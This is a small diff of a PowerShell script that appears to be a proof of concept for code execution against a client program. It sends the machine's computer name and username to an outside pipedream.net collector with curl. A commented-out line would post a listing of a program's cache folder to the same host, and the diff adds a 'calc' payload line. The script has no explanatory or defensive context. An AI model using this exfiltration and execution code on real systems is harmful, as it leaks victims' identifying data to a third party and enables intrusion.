@@ -1,7 +1,7 @@
 $target_user = "41341"
 $command = "calc;"
 curl https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username
- 
+ calc
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 #iwr -uri https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $e) -Method post
  
